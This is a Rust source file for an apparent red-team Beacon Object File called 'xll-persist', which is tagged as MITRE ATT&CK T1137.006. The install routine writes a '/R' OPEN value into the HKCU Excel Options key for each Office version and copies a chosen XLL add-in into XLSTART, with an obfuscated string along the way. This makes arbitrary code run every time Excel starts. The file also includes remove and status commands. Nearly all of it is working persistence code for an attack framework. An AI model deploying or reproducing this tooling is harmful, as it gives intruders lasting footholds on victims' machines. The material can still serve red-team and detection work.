// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//! xll-persist — Excel XLL add-in persistence (HKCU OPEN + XLSTART).
//! MITRE ATT&CK: T1137.006

#![cfg_attr(not(test), no_std)]
#![cfg_attr(all(not(test), target_os = "windows"), no_main)]

pub mod args;
pub mod reg_open;
pub mod xlstart;

#[cfg(target_os = "windows")]
pub mod dfr;
#[cfg(target_os = "windows")]
pub mod office;

#[cfg(target_os = "windows")]
use common::mitre::Technique;

#[cfg(target_os = "windows")]
const TECHNIQUES: &[Technique] = &[Technique {
    id: "T1137.006",
    name: "Office Application Startup: Add-ins",
    tactic: "Persistence",
}];

#[cfg(target_os = "windows")]
#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    let cmd = args::parse(&mut parser);
    match cmd {
        args::Cmd::Install(p) => install(&p),
        args::Cmd::Remove(p)  => remove(&p),
        args::Cmd::Status     => status(),
        args::Cmd::Invalid(m) => rustbof::eprintln!("[!] {}", m),
    }
}

#[cfg(target_os = "windows")]
fn install(path: &str) {
    use rustbof::{println, eprintln};
    use common::obf_cstr;
    let versions = office::enumerate_versions();
    if versions.is_empty() { eprintln!("[!] office not installed"); return; }
    for ver in &versions {
        let h = match office::open_excel_options(ver, dfr::KEY_ALL_ACCESS) {
            Ok(h) => h, Err(_) => continue,
        };
        let slot = reg_open::first_free(h);
        let slot = match slot {
            Some(i) => i,
            None    => { eprintln!("[!] OPEN slots full ({})", ver); office::close(h); continue; }
        };
        obf_cstr! { let r_flag = c"/R "; }
        let r_s = core::str::from_utf8(r_flag.to_bytes()).unwrap_or("");
        let mut val = alloc::string::String::with_capacity(r_s.len() + path.len());
        val.push_str(r_s);
        val.push_str(path);
        if reg_open::write(h, slot, &val).is_ok() {
            println!("[+] OPEN HKCU\\Software\\Microsoft\\Office\\{}\\Excel\\Options\\{}", ver, reg_open::slot_name(slot));
        } else {
            eprintln!("[!] registry op failed ({})", ver);
        }
        office::close(h);
    }
    let is_unc = path.starts_with("\\\\");
    if !is_unc {
        let dir = match xlstart::resolve_dir() { Ok(d) => d, Err(_) => { eprintln!("[!] file op failed"); return; } };
        let _ = xlstart::ensure_dir(&dir);
        let name = xlstart::basename(path);
        if xlstart::copy_into(path, &dir, name).is_ok() {
            println!("[+] XLSTART {}\\{}", dir, name);
        } else {
            eprintln!("[!] file op failed");
        }
    }
}

#[cfg(target_os = "windows")]
fn remove(path: &str) {
    use rustbof::{println, eprintln};
    let versions = office::enumerate_versions();
    if versions.is_empty() { eprintln!("[!] office not installed"); }
    for ver in &versions {
        let h = match office::open_excel_options(ver, dfr::KEY_ALL_ACCESS) { Ok(h) => h, Err(_) => continue };
        for idx in reg_open::find_matching(h, path) {
            if reg_open::delete(h, idx).is_ok() {
                println!("[+] removed OPEN {}\\{}", ver, reg_open::slot_name(idx));
            }
        }
        office::close(h);
    }
    let dir = match xlstart::resolve_dir() { Ok(d) => d, Err(_) => return };
    let name = xlstart::basename(path);
    for f in xlstart::list(&dir) {
        if f.eq_ignore_ascii_case(name) {
            let mut full = alloc::string::String::with_capacity(dir.len() + 1 + f.len());
            full.push_str(&dir);
            full.push('\\');
            full.push_str(&f);
            if xlstart::delete_file_path(&full).is_ok() {
                println!("[+] removed XLSTART {}", full);
            }
        }
    }
}

#[cfg(target_os = "windows")]
fn status() {
    use rustbof::println;
    let versions = office::enumerate_versions();
    for ver in &versions {
        let h = match office::open_excel_options(ver, dfr::KEY_READ) { Ok(h) => h, Err(_) => continue };
        for idx in 0..100 {
            if let Some(v) = reg_open::read(h, idx) {
                println!("  {}\\{} = {}", ver, reg_open::slot_name(idx), v);
            }
        }
        office::close(h);
    }
    let dir = match xlstart::resolve_dir() { Ok(d) => d, Err(_) => return };
    for f in xlstart::list(&dir) {
        println!("  XLSTART\\{}", f);
    }
}
